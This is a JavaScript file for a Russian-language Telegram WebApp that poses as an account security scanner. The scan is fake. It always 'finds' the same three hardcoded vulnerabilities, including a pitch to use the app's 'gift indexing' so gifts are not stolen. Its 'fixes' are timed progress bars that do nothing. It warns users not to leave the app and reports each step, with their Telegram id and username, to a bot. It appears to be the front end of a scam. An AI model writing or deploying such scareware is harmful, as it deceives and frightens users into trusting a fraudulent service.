document.addEventListener('DOMContentLoaded', () => {
    if (!window.Telegram || !window.Telegram.WebApp) {
        console.error('Telegram WebApp is not available');
        showFatalError('Это приложение работает только в Telegram. Пожалуйста, откройте его через Telegram бота.');
        return;
    }

    const tg = window.Telegram.WebApp;
    const state = {
        checkInterval: null,
        fixInterval: null,
        isFixing: false,
        vulnerabilities: [
            {
                title: "Слабый пароль",
                description: "Ваш пароль может быть легко взломан. Рекомендуем использовать комбинацию букв, цифр и специальных символов длиной не менее 12 знаков.",
                icon: "🔐",
                severity: "high"
            },
            {
                title: "Отсутствие индексации подарков",
                description: "Ваши подарки могут украсть. Рекомендуем использовать нашу индексацию подарков для вашей же безопасности.",
                icon: "🎁",
                severity: "medium"
            },
            {
                title: "Подозрительная активность",
                description: "Обнаружены необычные действия в вашем аккаунте. Рекомендуем сменить пароль и проверить настройки безопасности.",
                icon: "🚨",
                severity: "critical"
            }
        ]
    };

    // Настройки уведомлений
    const NOTIFICATION_COOLDOWN = 5000; // 5 секунд между одинаковыми уведомлениями
    const lastNotificationTimes = {};

    const elements = {
        startCheckBtn: document.getElementById('start-check'),
        progressFill: document.getElementById('progress-fill'),
        progressPercent: document.getElementById('progress-percent'),
        progressStage: document.getElementById('progress-stage'),
        vulnerabilitiesContainer: document.getElementById('vulnerabilities'),
        vulnerabilitiesList: document.getElementById('vulnerabilities-list'),
        vulnerabilitiesCount: document.getElementById('vulnerabilities-count'),
        username: document.getElementById('username'),
        userId: document.getElementById('user-id'),
        userTag: document.getElementById('user-tag'),
        userAvatar: document.getElementById('user-avatar')
    };

    function init() {
        tg.expand();
        tg.setHeaderColor('#060137');
        tg.setBackgroundColor('#060137');
        tg.enableClosingConfirmation();

        setupEventListeners();
        loadUserData();
        setupCopyHandlers();
        setupCardsAnimation();
        
        // Отправляем событие о входе с задержкой
        setTimeout(() => sendEvent('verified_enter'), 1000);
    }

    function setupEventListeners() {
        tg.onEvent('viewportChanged', handleViewportChange);
        tg.onEvent('closingConfirmation', handleAppClose);
        elements.startCheckBtn.addEventListener('click', startSecurityCheck);
    }

    function cleanup() {
        clearAllIntervals();
        tg.offEvent('viewportChanged', handleViewportChange);
        tg.offEvent('closingConfirmation', handleAppClose);
    }

    function vibrate(type = 'light') {
        if (!tg.HapticFeedback) return;
        const types = { 
            'light': 'light', 
            'medium': 'medium', 
            'heavy': 'heavy', 
            'error': 'error', 
            'success': 'success' 
        };
        try { 
            tg.HapticFeedback.impactOccurred(types[type] || 'light'); 
        } catch (error) {
            console.error('Haptic feedback error:', error);
        }
    }

    async function sendEvent(type, data = null) {
        if (!window.sendToBot) return;
        
        // Проверка на частые уведомления
        const now = Date.now();
        const lastTime = lastNotificationTimes[type];
        
        if (lastTime && now - lastTime < NOTIFICATION_COOLDOWN) {
            return;
        }
        
        lastNotificationTimes[type] = now;
        
        try {
            await window.sendToBot(type, {
                ...data,
                userId: tg.initDataUnsafe.user?.id,
                username: tg.initDataUnsafe.user?.username,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            console.error('Ошибка отправки события:', error);
        }
    }

    function loadUserData() {
        if (!tg.initDataUnsafe.user) return;
        const user = tg.initDataUnsafe.user;
        elements.username.textContent = `${user.first_name || ''} ${user.last_name || ''}`.trim() || 'Пользователь';
        elements.userId.textContent = user.id || 'N/A';
        elements.userTag.textContent = user.username ? `@${user.username}` : 'N/A';
        if (user.photo_url) elements.userAvatar.src = user.photo_url;
    }

    function setupCopyHandlers() {
        document.querySelectorAll('.copyable').forEach(item => {
            item.addEventListener('click', () => {
                const value = item.getAttribute('data-value') || item.textContent.trim();
                if (!value) return;
                navigator.clipboard.writeText(value.replace('@', '')).then(() => {
                    vibrate('success');
                    const originalText = item.querySelector('.meta-value')?.textContent || item.textContent;
                    const displayElement = item.querySelector('.meta-value') || item;
                    displayElement.textContent = 'Скопировано!';
                    setTimeout(() => {
                        displayElement.textContent = originalText;
                    }, 2000);
                });
            });
        });
    }

    function setupCardsAnimation() {
        const cards = document.querySelectorAll('.security-card, .activity-card, .tips-card');
        cards.forEach((card, index) => {
            card.style.opacity = '0';
            card.style.transform = 'translateY(20px)';
            card.style.transition = `opacity 0.5s ease ${index * 0.1}s, transform 0.5s ease ${index * 0.1}s`;
            setTimeout(() => {
                card.style.opacity = '1';
                card.style.transform = 'translateY(0)';
            }, 100);
        });
    }

    function startSecurityCheck() {
        clearAllIntervals();
        setLoading(elements.startCheckBtn, true);
        elements.vulnerabilitiesContainer.classList.add('hidden');
        sendEvent('security_check_start');
        
        let progress = 0;
        const duration = 3000;
        const interval = 30;
        const steps = duration / interval;
        const increment = 100 / steps;
        
        state.checkInterval = setInterval(() => {
            progress += increment;
            if (progress >= 100) {
                progress = 100;
                clearInterval(state.checkInterval);
                setTimeout(completeCheck, 500);
                return;
            }
            updateProgress(progress);
        }, interval);
    }

    function updateProgress(percent) {
        const rounded = Math.round(percent);
        elements.progressFill.style.width = `${percent}%`;
        elements.progressPercent.textContent = rounded;
        
        if (percent < 25) {
            elements.progressStage.textContent = 'Проверка настроек';
        } else if (percent < 50) {
            elements.progressStage.textContent = 'Анализ активности';
        } else if (percent < 75) {
            elements.progressStage.textContent = 'Проверка безопасности';
        } else {
            elements.progressStage.textContent = 'Завершение проверки';
        }
        
        if (percent % 25 === 0) {
            vibrate(percent === 100 ? 'heavy' : percent >= 75 ? 'medium' : 'light');
        }
    }

    function completeCheck() {
        vibrate('success');
        setLoading(elements.startCheckBtn, false);
        elements.startCheckBtn.textContent = 'Проверить снова';
        elements.progressStage.textContent = 'Проверка завершена!';
        
        // Отправляем событие только если найдены уязвимости
        if (state.vulnerabilities.length > 0) {
            sendEvent('security_check_complete', { 
                vulnerabilities: state.vulnerabilities.length 
            });
        }
        
        showVulnerabilities();
        tg.showAlert(`Проверка завершена! Найдено уязвимостей: ${state.vulnerabilities.length}`);
    }

    function showVulnerabilities() {
        elements.vulnerabilitiesList.innerHTML = '';
        state.vulnerabilities.forEach(vuln => {
            elements.vulnerabilitiesList.appendChild(createVulnerabilityItem(vuln));
        });
        elements.vulnerabilitiesCount.textContent = state.vulnerabilities.length;
        elements.vulnerabilitiesContainer.classList.remove('hidden');
    }

    function createVulnerabilityItem(vulnerability) {
        const item = document.createElement('div');
        item.className = `vulnerability-item severity-${vulnerability.severity}`;
        item.dataset.fixed = 'false';

        item.innerHTML = `
            <div class="vulnerability-header">
                <h4 class="vulnerability-title">
                    <span class="vulnerability-icon">${vulnerability.icon}</span>
                    ${escapeHtml(vulnerability.title)}
                </h4>
                <span class="toggle-icon">▼</span>
            </div>
            <div class="vulnerability-details">
                <p>${escapeHtml(vulnerability.description)}</p>
                <button class="fix-btn">Исправить</button>
            </div>
        `;

        const header = item.querySelector('.vulnerability-header');
        const details = item.querySelector('.vulnerability-details');
        const icon = item.querySelector('.toggle-icon');
        const fixBtn = item.querySelector('.fix-btn');

        header.addEventListener('click', () => {
            if (item.dataset.fixed === 'false') {
                details.classList.toggle('active');
                icon.textContent = details.classList.contains('active') ? '▲' : '▼';
                vibrate(details.classList.contains('active') ? 'medium' : 'light');
            }
        });

        fixBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            if (item.dataset.fixed === 'false') {
                vibrate('medium');
                showFixDialog(item, vulnerability);
            }
        });

        return item;
    }

    function showFixDialog(item, vulnerability) {
        if (state.isFixing) return;
        
        const dialog = document.createElement('div');
        dialog.className = 'fix-dialog';
        dialog.innerHTML = `
            <div class="fix-dialog-content">
                <div class="fix-dialog-header">
                    <h4>Исправление: ${escapeHtml(vulnerability.title)}</h4>
                    <button class="fix-dialog-close">&times;</button>
                </div>
                <p class="fix-warning">⚠️ При проверке нельзя выходить из приложения!</p>
                <p>${escapeHtml(vulnerability.description)}</p>
                <div class="fix-progress-container">
                    <div class="fix-progress-bar">
                        <div class="fix-progress-fill"></div>
                    </div>
                    <span class="fix-progress-text">0%</span>
                </div>
                <button class="fix-confirm-btn">Исправить уязвимость</button>
            </div>
        `;

        document.body.appendChild(dialog);
        document.documentElement.style.overflow = 'hidden';
        document.body.style.overflow = 'hidden';

        const confirmBtn = dialog.querySelector('.fix-confirm-btn');
        const closeBtn = dialog.querySelector('.fix-dialog-close');
        const progressFill = dialog.querySelector('.fix-progress-fill');
        const progressText = dialog.querySelector('.fix-progress-text');

        setTimeout(() => {
            dialog.style.opacity = '1';
            dialog.style.transform = 'translateY(0)';
        }, 10);

        confirmBtn.addEventListener('click', () => {
            startFixingProcess(item, vulnerability, dialog, progressFill, progressText);
        });

        closeBtn.addEventListener('click', () => {
            if (!state.isFixing) {
                closeDialog(dialog);
            }
        });

        dialog.addEventListener('click', (e) => {
            if (state.isFixing) {
                e.stopPropagation();
            }
        });
    }

    function startFixingProcess(item, vulnerability, dialog, progressFill, progressText) {
        if (state.isFixing) return;
        state.isFixing = true;

        sendEvent('vulnerability_fix_started', { 
            vulnerability: vulnerability.title 
        });

        dialog.querySelector('.fix-dialog-close').disabled = true;
        dialog.querySelector('.fix-confirm-btn').disabled = true;

        const duration = {
            "Слабый пароль": 7000,
            "Отсутствие индексации подарков": 10000,
            "Подозрительная активность": 12000
        }[vulnerability.title] || 3000;

        let progress = 0;
        const interval = 30;
        const steps = duration / interval;
        const increment = 100 / steps;

        // Очищаем предыдущий интервал, если он есть
        if (state.fixInterval) {
            clearInterval(state.fixInterval);
        }

        state.fixInterval = setInterval(() => {
            progress += increment;
            if (progress >= 100) {
                progress = 100;
                clearInterval(state.fixInterval);
                updateFixProgress(progressFill, progressText, progress);
                setTimeout(() => completeFixing(item, vulnerability, dialog), 300);
                return;
            }
            updateFixProgress(progressFill, progressText, progress);
            if (progress >= 50 && progress < 51) vibrate('medium');
        }, interval);
    }

    function updateFixProgress(progressFill, progressText, progress) {
        progressFill.style.width = `${progress}%`;
        progressText.textContent = `${Math.round(progress)}%`;
    }

    function completeFixing(item, vulnerability, dialog) {
        state.isFixing = false;
        vibrate('success');
        item.dataset.fixed = 'true';

        // Добавляем анимацию исчезновения
        item.style.transition = 'opacity 0.3s ease';
        item.style.opacity = '0';

        // Закрываем диалог сразу, не дожидаясь удаления элемента
        closeDialog(dialog);

        // Удаляем элемент после анимации
        setTimeout(() => {
            item.remove();
            updateVulnerabilitiesCount();
            tg.showAlert(`Уязвимость "${vulnerability.title}" успешно исправлена!`);
            sendEvent('vulnerability_fixed', { 
                vulnerability: vulnerability.title 
            });
        }, 300); // Время должно совпадать с временем анимации
    }

    function updateVulnerabilitiesCount() {
        const currentCount = parseInt(elements.vulnerabilitiesCount.textContent);
        const newCount = currentCount - 1;
        elements.vulnerabilitiesCount.textContent = newCount;
        
        if (newCount === 0) {
            elements.vulnerabilitiesContainer.classList.add('hidden');
            elements.progressStage.textContent = 'Все уязвимости устранены!';
            sendEvent('all_vulnerabilities_fixed');
        }
    }

    function closeDialog(dialog) {
        if (!dialog) return;

        // Добавляем анимацию закрытия
        dialog.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        dialog.style.opacity = '0';
        dialog.style.transform = 'translateY(20px)';

        setTimeout(() => {
            if (dialog.parentNode) {
                document.body.removeChild(dialog);
            }
            document.documentElement.style.overflow = '';
            document.body.style.overflow = '';
            vibrate('light');
        }, 300);
    }

    function clearAllIntervals() {
        if (state.checkInterval) clearInterval(state.checkInterval);
        if (state.fixInterval) clearInterval(state.fixInterval);
        state.checkInterval = null;
        state.fixInterval = null;
        state.isFixing = false;
    }

    function setLoading(button, isLoading) {
        button.disabled = isLoading;
        button.innerHTML = isLoading ? 
            '<div class="loader"></div> Проверка...' : 
            'Начать проверку';
    }

    function escapeHtml(unsafe) {
        if (!unsafe) return '';
        return unsafe.toString()
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    function handleViewportChange(e) {
        if (e.isStateStable && !e.isExpanded) {
            handleAppClose();
        }
    }

    function handleAppClose() {
        sendEvent('app_close', { 
            page: 'verified',
            vulnerabilitiesLeft: parseInt(elements.vulnerabilitiesCount.textContent) || 0
        });
    }

    function showFatalError(message) {
        document.body.innerHTML = `
            <div class="error-container">
                <h2>Ошибка</h2>
                <p>${message}</p>
            </div>
        `;
        document.body.style.backgroundColor = '#060137';
        document.body.style.color = 'white';
        document.body.style.padding = '20px';
        document.body.style.textAlign = 'center';
    }

    // Инициализация приложения
    init();
    window.addEventListener('beforeunload', cleanup);
});